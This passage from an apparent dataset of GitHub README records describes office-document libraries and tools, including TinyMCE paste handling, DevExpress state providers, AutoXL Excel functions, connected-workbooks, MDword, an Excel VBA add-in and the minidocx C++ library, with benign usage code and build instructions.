  。举个例子，浏览器禁止以编程方式访问文件系统，所以无法解析文档中使用 `file://` 协议的图片 (WPS 使用的就是此协议)。

- 粘贴微软 Word 文档 (Windows 系统、≥ 2013 版本) 中<font color=""#dd0000"">受保护视图</font>的内容，将仅得到**无格式的普通文本**，这是受保护视图与剪贴板的交互机制决定的。

- 受微软 Excel 网页版限制，粘贴<font color=""#dd0000"">微软 Excel 网页版</font>的内容将仅得到**无格式的普通文本**。

<br>

## 粘贴网页内容 (HTML)

### 格式

粘贴的网页内容默认会保留一定的源格式，启用 PowerPaste
插件后，对格式的处理将会更加完善。详见 [Improved HTML Cleaning](https://www.tiny.cloud/docs/tinymce/6/powerpaste-support/#improved-html-cleaning)

如需获取纯文本，选中**编辑**-**粘贴为文本**再进行粘贴

**清除格式**按钮得到的<font color=""#dd0000"">不是</font>纯文本，可以自定义清除效果：
[Removing a format](https://www.tiny.cloud/docs/tinymce/6/content-formatting/#removing-a-format)

<br>

### 图片

如果用户复制第三方网站的内容到编辑框内，静态资源 (如图片) 可能无法正常显示，这是因为：

1. 第三方网站没有开启静态资源的跨域访问

2. 第三方网站对静态资源做了 Referer 校验

TinyMCE 的 `urlconverter_callback`、`paste_postprocess` API 不支持异步操作，所以批量转存图片可行性低

技术上是可以解决的，可以通过 NGINX 动态代理配合这两个 API 来处理

请自行评估相关风险

DevExpress,aspnet-office-solutions,DevExpress,https://github.com/DevExpress/aspnet-office-solutions,https://api.github.com/repos/aspnet-office-solutions/DevExpress,A set of solutions for building scalable web applications containing DevExpress ASP.NET Spreadsheet and Rich Text Editor controls.,"﻿# Overview

This repository contains two ready-to-use **state providers** (for Redis and SQL data stores) and a set of **starter solutions** (for Azure and Amazon Web Services) to choose from when building scalable web applications with the use of DevExpress ASP.NET Office document processing components ([Spreadsheet](https://documentation.devexpress.com/AspNet/16157/ASP-NET-WebForms-Controls/Spreadsheet) and [Rich Text Editor](https://documentation.devexpress.com/AspNet/17721/ASP-NET-WebForms-Controls/Rich-Text-Editor)).

> **Starting with v20.1, we recommend that you use the client [RichEdit]( https://docs.devexpress.com/AspNetCore/400373/rich-edit) control instead of the server control with a state provider.** This allows you to avoid the following issues:
> 
> * RichEdit imports and exports a document model for every request to a state provider (for instance, changing a document content or opening a dialog). This consumes additional CPU resources.
> * A server's memory stores a document model because the control synchronizes the model between the server and client every time the model changes (for instance, text input or format change).
> * The server load increases non-linearly with the number of users.
> * Complex document and session management causes the [session expired error]( https://docs.devexpress.com/AspNet/401519/common-concepts/office-document-management/your-session-has-expired-error).
> * Complicated session error detection.
> * The server spell checker uses server memory and sends multiple checking requests to the server.
> * The server RichEdit cannot open documents over a certain size. However, the client RichEdit can open documents containing thousands of pages.
> * Closing the document can result in the loss of recent changes due to [client-server synchronization]( https://docs.devexpress.com/AspNet/401911/aspnet-webforms-controls/rich-text-editor/concepts/client-server-synchronization).
> 
> Note that the following features are not supported in the client RichEdit control.
> 
> * The DOC format; use third-party server libraries (for instance, [Office File API]( https://docs.devexpress.com/OfficeFileAPI/17488/word-processing-document-api)) for conversion
> * Document protection (coming in 20.2)
> * Spell check ([coming in 20.2](https://supportcenter.devexpress.com/internal/ticket/details/T913302))
> * Embedded file manager. You can use the [DevExtreme File Manager](https://js.devexpress.com/Documentation/Guide/Widgets/FileManager/Getting_Started_with_File_Manager/) to implement advanced file management functionality
> * [ASP themes]( https://docs.devexpress.com/AspNet/6655/common-concepts/appearance-customization-theming/available-themes); the control uses [DevExtreme themes]( https://js.devexpress.com/DevExtreme/Guide/Themes_and_Styles/Predefined_Themes/) only.

## State providers

An Office document state provider allows several web server instances to work together when processing a set of documents by persisting all opened documents' states in a separate storage. Web servers check-out the requested documents from storage, process them and return the latest document states. This means that web servers do not maintain any server-specific state between requests using a document state provider, which enables the application to be dynamically scaled.

The following Office document state providers are available: 

* **RedisOfficeStateProvider**  
A state provider implementation that uses a Redis cache as the document state storage.

* **SqlOfficeStateProvider**  
A state provider implementation that uses an SQL Server database as the document state storage.


A solution that uses a state provider is highly scalable and provides support for Web Gardens, Web Farms, and clouds with IIS/ASP.NET-based web servers.

## Starter solutions

We have prepared the following starter templates to help you get started with application scalability when using our ASP.NET Spreadsheet and Rich Text Editor controls.

### For Microsoft Azure:

* **Azure-RedisOfficeStateProvider-Starter**  
An example of an [Azure Cloud Service](https://docs.microsoft.com/en-us/azure/cloud-services/cloud-services-choose-me) that uses the [Azure Redis Cache](https://docs.microsoft.com/en-us/azure/redis-cache/) to store document states between user requests to multiple web servers.

* **Azure-SqlOfficeStateProvider-Starter**  
An example of an [Azure Cloud Service](https://docs.microsoft.com/en-us/azure/cloud-services/cloud-services-choose-me) that uses the [Azure SQL Database](https://docs.microsoft.com/en-us/azure/sql-database/) to store document states between user requests to multiple web servers.

* **Azure-SessionAffinity-Starter**  
An example of an [Azure Cloud Service](https://docs.microsoft.com/en-us/azure/cloud-services/cloud-services-choose-me) that uses the session affinity paradigm and custom-implemented smart request routing that routes requests from a user to the web server instance that has the requested document loaded in RAM.

### For Amazon Web Services:

* **AWS-RedisOfficeStateProvider-Starter**  
An example of a web application that uses [Amazon ElastiCache for Redis](https://aws.amazon.com/redis/) to store document states between user requests to multiple web servers. The application can be deployed to the [AWS Elastic Beanstalk](https://aws.amazon.com/elasticbeanstalk/) environment.

* **AWS-SqlOfficeStateProvider-Starter**  
An example of a web application that uses [Amazon Relational Database Services](https://aws.amazon.com/rds/) to store document states between user requests to multiple web servers. The application can be deployed to the [AWS Elastic Beanstalk](https://aws.amazon.com/elasticbeanstalk/) environment.

# Choosing What to Use

Use the tables below to determine the appropriate approach.

## Which starter solution to choose

### For Microsoft Azure

The following table compares the available starter templates:

| Azure Solution| Ease of Adaptation | Scalability  | Performance |
| --- |:---:|:---:|:---:|
| Session Affinity-based | Complex solution. Requires building specific application architecture | High, but may require additional coding | Maximum |
| Redis/SQL State Provider-based | Simple to use | Easy to scale | Slower than Session Affinity |


### For Amazon Web Services

**Note:** For the Amazon Web Services environment, we provide only Redis/SQL State Provider-based solutions since they are easy to use and can be embedded into your existing applications without any modification.

## Which provider to choose

Both state provider solutions are used in the available Microsoft Azure and Amazon Web Services starter solutions without modifications. The provider solutions can also be reused in custom projects for dynamically scaled web applications.

The following table compares the available document state providers:

| Provider | Performance | Autosave Support | Hibernation Support |
| --- |:---:|:---:|:---:|
| Redis Storage-based | High | Required. Needs custom coding | Required. Needs custom coding | 
| SQL Server Database-based | Slower than Redis | Not required, but possible with custom coding | Not required, but possible with custom coding |

Unlike Redis, an SQL Server database is a persistent storage. This means that an SQL server does not drop the document state after rebooting.

Redis uses RAM to store document states and requires that the Redis server has sufficient RAM to store all open documents' states.

The SQL Server stores document states in a database on a persistent storage (HDD/SDD) and requires that the SQL Server database has sufficient size to store all open documents' states.

**Choose Redis** if a developer can guarantee that the Redis server RAM has sufficient storage for all opened documents’ states. We recommend implementing custom document autosaving and hibernation - this reduces the Redis RAM consumption and improves Redis' persistence.

**Choose SQL** as a long-term solution when working with a large number of documents or if implementing custom document autosaving and hibernation is not possible.

MatrixFun,AutoXL,,https://github.com/MatrixFun/AutoXL,https://api.github.com/repos/AutoXL/MatrixFun,A fundamental library of Excel functions written in Excel formula language by LAMBDA function for spreadsheet automation,"# AutoXL

**AutoXL is a fundamental and powerful library of Excel functions written in Excel formula language.** It especially enables Excel users to automate manual tasks, by extensions of lookup and references functions, and elementary functions for array and set, etc. It thus saves Excel users lots of time, and avoids tedious and error-prone manual operations.

## Function categories

At the moment, AutoXL consists of 29 functions mainly in 3 categories:
- Practical, useful, handy and powerful functions to automate manual tasks. For instance,
    - `A.LOCATE.CELLBYTEXT` to find a cell in a range that contains a given text.`A.LOCATE.RANGEBYTEXT` to find a header in a range that contains a given text and to return the data below the header
    - `A.DUPLICATES` to find duplicates in a range
- Extensions of traditional built-in ""lookup and reference"" functions, to make them address all real-world use cases. For instance,
    - `A.XLOOKUP.ROWS` and `A.XLOOKUP.COLS` for built-in `XLOOKUP`
    - `A.XMATCH.ROWS` and `A.XMATCH.COLS` for built-in `XMATCH`
- Elementary functions for compound data types such as array and set. For instance,
    - `A.UNION.CELLS`, `A.INTERSECT.CELLS`, `A.SETDIFF.CELLS` for set
    - `A.EQ` for array

## Users

As manual operations in Excel exist everywhere, AutoXL is **cross-sectors**. It will mainly benefit 
- Excel users who know basic functions like `VLOOKUP` and are willing to try more
- Advanced Excel users who have lots of formulas in their workbooks
- VBA developers
- Developers in other programming languages and want to realize tasks in Excel

## Demo

[![Demo Video](https://i.imgur.com/dJFYTs8.png)](https://www.youtube.com/watch?v=WtBtnwtyBM4)

## Installation

**Excel version requirement:** Many functions of AutoXL are written with newly-introduced built-in functions of Excel, which require Microsoft 365 and probably don't exist in non-subscription Office 2019 or later. Therefore, AutoXL has the same requirement. You could simply type `=VSTACK` in a cell, if its intellisense shows up, that means your Excel meets the requirement.

<!-- If you don't have the good version of Excel on your machine, you could always use [Excel Online](https://www.office.com/launch/excel?ui=en-US&rs=GB&auth=1) which has new functions and is free. -->

**Get started quickly:** You could download the workbook `Demo/AutoXL-Demo.xlsx` where AutoXL has been already added. It also contains sample data and formulas which allow you to get familiar with use of functions. Formula Editor will be auto-opened.

**Installation:** Besides using Microsoft's AFE, you could use [Formula Editor](https://www.10studio.tech/docs/formulaEditor) to add the AutoXL library to your workbook, which will provide a version control. The latest stable versions of AutoXL will always be available in Formula Editor.

![alt text](Demo/VersionControl.gif)

**Uninstallation:** To remove the library from your workbook, 
- either you could go to ""Name Manager"" and manually delete all the functions starting with `A.` (make sure that you don't have other user-defined functions or ranged names starting with `A.`)
- or under Formula Editor, you could go to ""Libraries => AutoXL => Remove""; it will only remove AutoXL's functions.
## Documentation

The documentation on a website is coming soon. At the moment, you could refer to the comments in the file `AutoXL.txt` to see the list of the functions, their purpose, their arguments, etc.

Additionally, here are related built-in functions of Excel:
- Traditional [lookup and reference functions](https://support.microsoft.com/en-us/office/lookup-and-reference-functions-reference-8aa21a3a-b56a-4055-8257-3ec89df2b23e)
- [LAMBDA function](https://techcommunity.microsoft.com/t5/excel-blog/announcing-lambda-turn-excel-formulas-into-custom-functions/ba-p/1925546)
- [LAMBDA helper functions](https://techcommunity.microsoft.com/t5/excel-blog/announcing-lambda-helper-functions-lambdas-as-arguments-and-more/ba-p/2576648)
- [New text and array functions](https://techcommunity.microsoft.com/t5/excel-blog/announcing-new-text-and-array-functions/ba-p/3186066)

## License

AutoXL is [MIT licensed](https://github.com/MatrixFun/AutoXL/blob/main/LICENSE).
## Design principles

The design and implementation of AutoXL has the following principles:
- Make practical, useful and friendly functions for concrete common tasks driven by Excel end-users
- Make conventional and basic functions for fundamental and compound data types that Excel does not provide
- Follow existing terminology, convention and style of Excel for naming functions and arguments, and default value of parameters, etc.
- Robust, safe, easy-to-understand, and efficient implementation

<!-- rely on derived names rather than optional arguments, because we aim to benefit end-users -->

2. Advanced capabilities of **""Export a Power Query connected workbook""**:
    - Can refresh your data on open and/or on demand.
    - Allows for initial data population.
    - Supports more advanced scenarios where you provide branded/custom workbooks, and load your data into PivotTables or PivotCharts.

Connected Workbooks allows you to avoid ""data dumps"" in CSV form, providing a richer experience with Tables and/or connected Queries for when your business application supports it.

## How do I use it? here are some examples:

### 1. Export a table directly from an Html page:
```typescript
import workbookManager from '@microsoft/connected-workbooks';

const blob = await workbookManager.generateTableWorkbookFromHtml(document.querySelector('table') as HTMLTableElement);    
workbookManager.downloadWorkbook(blob, ""MyTable.xlsx"");
```

### 2. Export a table from raw data:
```typescript
import workbookManager from '@microsoft/connected-workbooks';

const grid = {
  config: { promoteHeaders:true, adjustColumnNames:true }
  data: [
      [""Product"", ""Price"", ""InStock"", ""Category"", ""Date""],
      [""Widget A"", 19.99, true, ""Electronics"", ""10/26/2024""],
      [""Gizmo B"", 9.99, true, ""Accessories"", ""10/26/2024""],
      [""Bubala"", 14.99, false, ""Accessories"", ""10/22/2023""],
      [""Thingamajig C"", 50, false, ""Tools"", ""5/12/2023""],
      [""Doohickey D"", 50.01, true, ""Home"", ""8/12/2023""]
  ]
};
const blob = await workbookManager.generateTableWorkbookFromGrid(grid);    
workbookManager.downloadWorkbook(blob, ""MyTable.xlsx"");
```
<img width=""281"" alt=""image"" src=""https://github.com/microsoft/connected-workbooks/assets/7674478/b91e5d69-8444-4a19-a4b0-3fd721e5576f"">

### 3. Control Document Properties:
```typescript
const blob = await workbookManager.generateTableWorkbookFromHtml(
  document.querySelector('table') as HTMLTableElement, {
    docProps: { 
      createdBy: 'John Doe',
      lastModifiedBy: 'Jane Doe',
      description: 'This is a sample table'
    }
  }
);
    
workbookManager.downloadWorkbook(blob, ""MyTable.xlsx"");
```
![image](https://github.com/microsoft/connected-workbooks/assets/7674478/c267c9eb-6367-419d-832d-5a835c7683f9)

### 4. Export a Power Query connected workbook:
```typescript
import workbookManager from '@microsoft/connected-workbooks';

const blob = await workbookManager.generateSingleQueryWorkbook({
  queryMashup: 'let \
                    Source = {1..10} \
                in \
                    Source',
  refreshOnOpen: true
});

workbookManager.downloadWorkbook(blob, ""MyConnectedWorkbook.xlsx"");
```
![image](https://github.com/microsoft/connected-workbooks/assets/7674478/57bd986c-6309-4963-8d86-911ccf496c3f)

(after refreshing on open)
### Advanced Usage - bring your own template:

You can use the library with your own workbook as a template!

```typescript
const blob = await workbookManager.generateSingleQueryWorkbook(
  { queryMashup: query, refreshOnOpen: true },
  undefined /* optional Grid */,
  templateFile);
workbookManager.downloadWorkbook(blob, ""MyBrandedWorkbook.xlsx"");
```
![image](https://github.com/microsoft/connected-workbooks/assets/7674478/e5377946-4348-4229-9b88-1910ff7ee025)

Template requirements:

Have a single query named **Query1** loaded to a **Query Table**, **Pivot Table**, or a **Pivot Chart**.


⭐ Recommendation - have your product template baked and tested in your own product code, instead of your user providing it.

⭐ For user templates - a common way to get the template workbook with React via user interaction:

```typescript
const [templateFile, setTemplateFile] = useState<File | null>(null);
...
<input type=""file"" id=""file"" accept="".xlsx"" style={{ display: ""none"" }} onChange={(e) => {
  if (e?.target?.files?.item(0) == null) return;
  setTemplateFile(e!.target!.files!.item(0));
}}/>
```

mkdreams,MDword,,https://github.com/mkdreams/MDword,https://api.github.com/repos/MDword/mkdreams,A pure PHP library for change word processing documents.  OFFICE WORD Dynamic data binding data generation report. Generate awesome word(docx) with template,"# MDword 
## [中文文档](https://github.com/mkdreams/MDword/blob/main/README-CN.md)

##  Project General Name
Template: a word which will be revised.  
Block: the part which will be replaced or cloned.

## Project Introduction
Main Use: to generate word dynamically.  
Advantage: focus only on dynamic data and logic, rather than adjusting the style, which can modulate the template with the help of office word.

## Comparison between MDword & PHPword
+ ### Similarities
1. PHP Package.
2. Both can be used to generate office word.

+ ### Differences
1. PHPword concentrates on writing elements one by one. However,
it is more powerful and efficient for Mdword just to revise  them on the template.
2. For updating text styles, adding covers, headers and footers, MDword just modifies the template by office word, while PHPword complicate the task-adjusting every element.
3. Directories(Table of content) can be automatically generated.

## Tutotials
+ ### Installation
```
// Method 1
composer require mkdreams/mdword
// Method 2, Autoloading Template
require_once('Autoloader.php');
```

+ ### Add annotations or use “${value/}” to the template. Please note that there is a “/” at the end.

+ ### Invocation Methods (more and richer approaches, for example: [tests\samples\simple for readme](https://github.com/mkdreams/MDword/blob/main/tests/samples/simple%20for%20readme/index.php), such as catalog, sequence number, etc.)
```
// New class,load template
$TemplateProcessor = new WordProcessor();
$template = 'temple.docx';
$TemplateProcessor->load($template);

// Set Value
$TemplateProcessor->setValue('value', 'r-value');

// Clone 
$TemplateProcessor->clones('people', 3);

$TemplateProcessor->setValue('name#0', 'colin0');
$TemplateProcessor->setValue('name#1', [
    ['text'=>'colin1','style'=>'style','type'=>MDWORD_TEXT],
    ['text'=>1,'type'=>MDWORD_BREAK],
    ['text'=>'86','style'=>'style','type'=>MDWORD_TEXT]
]);
$TemplateProcessor->setValue('name#2', 'colin2');

$TemplateProcessor->setValue('sex#1', 'woman');

$TemplateProcessor->setValue('age#0', '280');
$TemplateProcessor->setValue('age#1', '281');
$TemplateProcessor->setValue('age#2', '282');

// set value for image
$TemplateProcessor->setImageValue('image', dirname(__FILE__).'/logo.jpg');

// Delete a paragraph
$TemplateProcessor->deleteP('style');

// Save
$rtemplate = __DIR__.'/r-temple.docx';
$TemplateProcessor->saveAs($rtemplate);
```

This is an addin for Excel, which extends the default functionality of Excel with more than 50 tools. The tools were developed to save the user time when doing monotonous tasks in Excel and some are meant to speed up Excel's default tools. It features tools for unexperienced and experienced users. A few tools overlap with those of Power-Query, but most of them solve problems, which Power-Query doesn't. The idea is to keep it easy to use for everybody. For that reason, there is also no documentation, because I tried to keep the tools self-explanatory. If you want to contribute to the development or show your appreciation, head to the section [**Contribution**](#Contribution). Once the addin is installed, a new tab will appear in Excel as illustrated in the following screenshot:

<p align=""center"">
  <img width=""100%"" src=""/screenshots/ribbon-tab.png"">
</p>

*I developed [another addin](https://github.com/Max-Schmeling/excel-contact-tools) for Excel, which can considerably reduce the time you spend in Excel, when working with contact information, such as when you're working in a human resource department.*

# What can the addin do for you?
Here is a quick summary of the features (from left to right in the screenshot).
* Group ***Navigation***: This group of tools is useful for users who work with large tables, because it allows you to navigate in worksheets quickly. Clicking one of the eight arrows will make the view jump to the last or first cell which contains data, depending on which direction you choose.
* Menu ***Select***: This menu contains tools to expand the current selection in various directions. That's also useful, if you work very large tables. To make an example, say you have a table with 500k rows, and you want to select the data of a column in that table (ie. not the entire column), whose cells are empty every other row. In this case, neither `CTRL`+`SPACE` nor `CTRL`+`SHIFT`+`UP/DOWN-ARROW` will help you - but the tool *Expand selection to the top/bottom* has got you covered.
* Menu ***Workbook***: This menu contains tools to manage the current workbook. This includes renaming, moving, deleting, or opening the directory of the current workbook in the file-explorer, without having to close or minimize the workbook. It also includes tools to hide or unhide multiple worksheets with one click.
* Menu ***Worksheet***: This menu contains tools to edit the current worksheet. This includes hiding and unhiding multiple columns at once, and resizing or inserting multiple cells at once. It also includes a tool to delete unused rows in a worksheet, in case you get hold of a workbook whose worksheets are endlessly scrollable.
* Menu ***Range***: This menu contains tools to edit a range of cells with one click. This includes tools to convert formulas to values, convert numbers stored as text to numbers (faster than Excel can do), apply a calculation to multiple number-cells, reset selected formats (this is useful when you have a worksheet which is headachingly bad formatted), and transforming ranges.
* Menu ***Text***: This menu contains tools to edit the text in multiple cells at once. You can remove excessive whitespace and invisible characters, remove specific text, remove characters at a specific position, and insert text at a specific position.
* Menu ***Table***: This menu contains tools to analyze and edit tables. You can find duplicates in each column of a table, find out which columns are unique (i.e. best for doing VLOOKUPs), split a table into multiple tables (also with separate worksheets or workbooks if you want to), combine multiple tables from multiple workbooks into one table, convert A1-references into table-references (e.g. [@[mycolumn]])

# Compatibility

The addin only works for local installations of Microsoft Excel, i.e., this add-in does not work with a browser-version of Microsoft Office.

# Installation

1. Download the file named *excel-essential-tools-addin.xlam*
2. Install the addin-file according to the instructions for **xlam**-addins. Head to the [official Microsoft website](https://support.microsoft.com/en-us/office/add-or-remove-add-ins-in-excel-0af570c4-5cf3-4fa9-9b88-403625a0b460) or simply ask google *How to install xlam-addins in Excel?*
4. Restart Excel
5. A new ribbon named *Contacts* should have appeared
6. Congrats! The addin is installed and you should be able to use it. If not, check out the troubleshooting-section.

# Troubleshooting

1. If a yellow banner appears at the top of your spreadsheet, you will have to click `Enable Content`, before the add-in becomes usable.
2. Head to *File >> Options >> Trust Center >> Macro Settings* in Excel and make sure that macros and the VBA-object model are both enabled (see screenshot):
<p align=""center"">
  <img width=""100%"" src=""/screenshots/enable_macros2.png"">
</p>

# Contribution

The addin is by no means perfect. If you want to contribute, there are two favorable ways:
1. If you find any imperfections such as typos, bugs, or performance issues, feel free to open an issue.
2. If you want to translate the addin into your language you can open an issue for that too. The basic multi-language functionality is already implemented, new languages just need to be added.
3. People told me they'd be willing to pay for some of the features. If you like what you use, I'd be happy to accept a dontation: [![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.com/donate?hosted_button_id=V84BCLCD8DQK4)

# Disclaimer

Do whatever you want with the source code, but make it open source when you publish anything based on the contents of this repository! Also do not sue me and do not make me responsible for any damage caused by the use of the addin. When using VBA-based addins its always a good idea to save your work regularly.

English | [简体中文](./README-zh_CN.md)

minidocx is a portable and easy-to-use C++ library for creating Microsoft Word Document (.docx) from scratch. It is designed to be simple and small enough. So, you can grab these files and compile them into your project.

## Requirements

To build minidocx you'll need a C++11 compiler and the following libraries:

- [zip](https://github.com/kuba--/zip) <= 0.2.1
- [pugixml](https://github.com/zeux/pugixml) >= 1.13

It is tested for the following platform:

- CMake 3.21
- Visual Studio 16 2019 / Visual Studio 14 2015 / GCC 8.2+
- Windows 7/10 / Ubuntu 18.04 / Kylin-Desktop V10-SP1

## References

To manipulate a docx file, you need to understand at least the following three concepts:

- `Paragraph` Text with the same paragraph formatting.
- `Run` Text with the same font formatting.
- `Section` A division of a document having the same page layout settings, such as margins and page orientation.

Documents contain sections, you can have multiple sections per document. This simple example will only contain one section. More informations are available in [this site](http://officeopenxml.com/).

## Examples

Here's an example of how to use minidocx to create a .docx file.

```cpp
#include ""minidocx.hpp""

using namespace docx;

int main()
{
  Document doc(""./a.docx"");

  auto p1 = doc.AppendParagraph(""Hello, World!"", 12, ""Times New Roman"");
  auto p2 = doc.AppendParagraph(u8""你好，世界！"", 14, u8""宋体"");
  auto p3 = doc.AppendParagraph(u8""你好，World!"", 16, ""Times New Roman"", u8""宋体"");

  auto p4 = doc.AppendParagraph();
  p4.SetAlignment(Paragraph::Alignment::Centered);

  auto p4r1 = p4.AppendRun(""This is a simple sentence. "", 12, ""Arial"");
  p4r1.SetCharacterSpacing(Pt2Twip(2));

  auto p4r2 = p4.AppendRun(u8""这是一个简单的句子。"");
  p4r2.SetFontSize(14);
  p4r2.SetFont(u8""黑体"");
  p4r2.SetFontStyle(Run::Bold | Run::Italic);

  doc.Save();
  return 0;
}
```

See other [examples](./examples).

## Build Instructions

```bash
git clone git@github.com:totravel/minidocx.git
cd minidocx

# Windows
cmake -S . -B build -DBUILD_EXAMPLES=ON -DWITH_STATIC_CRT=OFF
cmake --build build --config Release -j
cmake --install build --prefix install --config Release

# Linux
cmake -S . -B build -DCMAKE_BUILD_TYPE=Release -DBUILD_EXAMPLES=ON -DWITH_STATIC_CRT=OFF
cmake --build build -j
cmake --install build --prefix install
```

## User Guide

`minidocx.hpp` is the only header which you need to include in order to use minidocx classes/functions. All minidocx classes/functions are member of the `docx` namespace.

```cpp
#include ""minidocx.hpp""

using namespace docx;
```

Following sections describe the functionality supported by minidocx. Please note this description may not be complete but limited to the most useful ones. If you want to find less common features, please check header files under `src` directory.

### Units

The main unit in OOXML are twentieths of a point (Twip) from the [OOXML](http://officeopenxml.com/) specification. This is used for specifying page dimensions, margins, tabs, etc. minidocx provided some helper functions for unit conversions:

```cpp
int Pt2Twip(const double pt);       // points to twip
double Twip2Pt(const int twip);     // twip to points

int Inch2Twip(const double inch);   // inches to twip
double Twip2Inch(const int twip);   // twip to inches

int MM2Twip(const int mm);          // mm to twip
int Twip2MM(const int twip);        // twip to mm

int CM2Twip(const double cm);       // cm to twip
double Twip2CM(const int twip);     // twip to cm

double Inch2Pt(const double inch);  // inches to points
double Pt2Inch(const double pt);    // points to inches

double MM2Inch(const int mm);       // mm to inches
int Inch2MM(const double inch);     // inches to mm

double CM2Inch(const double cm);    // cm to inches
double Inch2CM(const double inch);  // inches to cm
```

See [Lars Corneliussen's blog post](https://startbigthinksmall.wordpress.com/2010/01/04/points-inches-and-emus-measuring-units-in-office-open-xml/) for more information and how to convert units.

### Document

`Document` is the class which is able to write a .docx file. To create a new document, it is very easy:

```cpp
Document doc(""./a.docx"");
```

The last step is to save the document:

```cpp
doc.Save();
```

### Paragraph

`Paragraph` is the class that represents a paragraph. You can create paragraphs in the following ways:

```cpp
auto p1 = doc.AppendParagraph(); // Append a new document to the document
auto p3 = doc.InsertParagraphAfter(p1);  // Insert a new document after p1
auto p2 = doc.InsertParagraphBefore(p3); // Insert a new document before p3
```

It is easy to get every paragraph of the document:

```cpp
auto p1 = doc.FirstParagraph();
auto p3 = doc.LastParagraph();
auto p2 = p3.Prev(); // Next() also available
```

Paragraphs can be removed:

```cpp
doc.RemoveParagraph(p3); // Remove p3
```

You can check if two `Paragraph` instances represent the same paragraph:

```cpp
if (p1 == p2) {
  std::cout << ""They're the same paragraph\n"";
}
```

### Run

You can add multiple runs in paragraph:

```cpp
auto p4 = doc.AppendParagraph();
auto p4r1 = p4.AppendRun(""Hello, World!"");
auto p4r2 = p4.AppendRun(u8""你好，世界！"");
auto p4r3 = p4.AppendRun(u8""你好，World!"");
```

When you create a new paragraph by providing text to the `AppendParagraph()` method, it gets put into a single run.

```cpp
auto p5 = doc.AppendParagraph(""Hello, World!"");
// is equivalent to:
auto p5 = doc.AppendParagraph();
auto p5r1 = p5.AppendRun(""Hello, World!"");
```

Font size and typeface can be specified when adding a new run.

```cpp
auto p5r2 = p5.AppendRun(""Hello, World!"", 12, ""Times New Roman"");
```

Font size is specified in points.

You can create an empty run and add text to it later.

```cpp
auto p5r3 = p5.AppendRun();
p5r3.AppendText(""Hello, World!"");
p5r3.AppendText(u8""你好，世界！"");
p5r3.AppendText(u8""你好，World!"");
```

You can get the text contained in the run:

```cpp
auto text = p5r3.GetText(); // ""Hello, World!你好，世界！你好，World!""
```

You can set character formatting for a run after it is created.

```cpp
p5r3.SetFontSize(14);
p5r3.SetFont(""Times New Roman"");
p5r3.SetFontStyle(Run::Bold | Run::Italic); // Run::Underline and 
                                            // Run::Strikethrough also available
p5r3.SetCharacterSpacing(Pt2Twip(2));
```

Helper function `Pt2Twip()` can be used to specify a character spacing in points.

It is easy to get each run in a paragraph:

```cpp
auto p4r1 = p4.FirstRun(); // no LastRun()
auto p4r2 = p4r1.Next(); // no Prev()
```

Run can be removed:

```cpp
p4r2.Remove();
```

#### Line Break

You can append a line break into a run. 

```cpp
auto r = p.AppendRun();
r.AppendText(""This is"");
r.AppendLineBreak();
r.AppendText(""a simple sentence."");
```

#### Page Break

Page breaks are special run that can only be appended to a paragraph by calling `AppendPageBreak()`.

```cpp
auto r = p.AppendPageBreak();
```

### Section

Each document contains at least one section and you can't remove it.

To create a new section, you need to insert a section break. Section break needs to be inserted into a paragraph. So, you need to prepare a paragraph first, and then insert a section break to it.

```cpp
p3.InsertSectionBreak();
```

The paragraph containing a section break will be the last paragraph of the new section.

You can check if the paragraph contain a section break.

```cpp
if (p3.HasSectionBreak()) {
  std::cout << ""p3 is the last paragraph of this section\n"";
}
```

Section break can be removed:

```cpp
p3.RemoveSectionBreak();
```

`Section` is the class that represents a Section. You can get every section of the document:

```cpp
auto s1 = doc.FirstSection();
auto s2 = s1.Next(); // Prev() also available
```

You can get the first/last paragraph of a section.

```cpp
auto p1 = s1.FirstParagraph();
```

You can check if two `Section` instances represent the same section:

```cpp
if (s1 == s2) {
  std::cout << ""They're the same Section\n"";
}
```

You can set page formatting for a section.

```cpp
s1.SetPageSize(MM2Twip(297), MM2Twip(420)); // A3
s1.SetPageOrient(Section::Orientation::Landscape);
```

#### Page Number

The page numbers for pages in the section can be added and removed by using `SetPageNumber()` and `RemovePageNumber()`:

```cpp
s1.SetPageNumber(docx::Section::PageNumberFormat::Decimal);         // 1, 2, 3, ...
s1.SetPageNumber(docx::Section::PageNumberFormat::NumberInDash, 3); // -3-, -4-, -5-, ...
s1.RemovePageNumber();
```

### Table

You can insert a table by using `Document::AppendTable()`.

```cpp
auto tbl = doc.AppendTable(2, 3);
```

Each cell already contains a paragraph.

```cpp
tbl.GetCell(0, 0).FirstParagraph().AppendRun(""AAA"");
tbl.GetCell(0, 1).FirstParagraph().AppendRun(""BBB"");
tbl.GetCell(0, 2).FirstParagraph().AppendRun(""CCC"");

tbl.GetCell(1, 0).FirstParagraph().AppendRun(""DDD"");
tbl.GetCell(1, 1).FirstParagraph().AppendRun(""EEE"");
```

| AAA  | BBB  | CCC  |
| ---- | ---- | ---- |
| DDD  | EEE  |      |

You can change the style, width (points) and color (hex) of borders.

```cpp
tbl.SetTopBorders(Table::BorderStyle::Single, 1, ""FF0000"");      // a single line, 1 pt, Red
tbl.SetBottomBorders(Table::BorderStyle::Dotted, 2, ""00FF00"");   // a dotted line, 2 pt, Green
tbl.SetLeftBorders(Table::BorderStyle::Dashed, 3, ""0000FF"");     // a dashed line, 3 pt, Blue
tbl.SetRightBorders(Table::BorderStyle::DotDash, 0.5, ""FFFF00""); // a line with alternating dots and dashes, 1/2 pt, yellow
tbl.SetInsideHBorders(Table::BorderStyle::Double, 1, ""FF00FF"");  // a double line, 1 pt, purple
```

#### Merge cells

You can merge adjacent cells with the same number of rows or columns.

```cpp
auto c00 = tbl.GetCell(0, 0);
auto c01 = tbl.GetCell(0, 1);
if (tbl.MergeCells(c00, c01)) {
  std::cout << ""c00 c01 merged\n"";
}
```

### Text Frame

A text frame is similar to a text box. Both are containers for text that can be positioned on a page and sized. Text boxes have more flexibility for formatting.

A text frame paragraph is simply a paragraph.

```cpp
auto frame = doc.AppendTextFrame(CM2Twip(4), CM2Twip(5));
frame.AppendRun(""This is the text frame paragraph."");

frame.SetPositionX(TextFrame::Position::Left, TextFrame::Anchor::Page);
frame.SetPositionY(TextFrame::Position::Top,  TextFrame::Anchor::Margin);

frame.SetTextWrapping(TextFrame::Wrapping::Around);
```

